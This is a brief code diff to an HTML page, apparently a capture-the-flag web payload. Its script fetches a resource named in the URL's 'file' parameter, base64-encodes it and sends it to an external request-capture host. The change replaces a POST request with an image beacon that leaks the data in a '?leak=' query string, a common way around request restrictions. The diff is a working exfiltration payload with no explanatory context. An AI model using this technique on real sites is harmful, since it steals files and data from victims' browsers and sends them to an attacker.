@@ -5,12 +5,10 @@
 fetch(new URLSearchParams(location.search).get("file"))
   .then(r => r.text())
   .then(data => {
-    const b64 = btoa(data);
-    fetch("https://uheyzgr.request.dreamhack.games", {
-      method: "POST",
-      body: b64
-    });
+    const img = new Image();
+    img.src = "https://uheyzgr.request.dreamhack.games?leak=" + encodeURIComponent(btoa(data));
   });
 </script>
+
 </body>
 </html>
